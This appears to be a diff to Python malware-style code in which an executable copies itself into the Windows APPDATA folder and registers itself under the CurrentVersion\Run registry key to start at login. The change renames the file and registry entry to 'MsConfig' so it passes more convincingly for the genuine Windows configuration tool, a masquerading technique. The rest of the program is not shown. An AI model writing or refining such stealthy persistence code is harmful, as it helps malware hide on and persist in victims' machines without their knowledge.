@@ -13,7 +13,7 @@ from winreg import (
 
 def copy_to_roaming():
     roaming_path = getenv("APPDATA")
-    new_path = path.join(roaming_path, "ms-config.exe")
+    new_path = path.join(roaming_path, "MsConfig.exe")
 
     if not path.exists(new_path):
         try:
@@ -26,7 +26,7 @@ def copy_to_roaming():
 def add_to_registry(exe_path):
     reg_key = HKEY_CURRENT_USER
     reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-    name = "MS Config"
+    name = "MsConfig"
 
     try:
         key = OpenKey(reg_key, reg_path, 0, KEY_SET_VALUE)
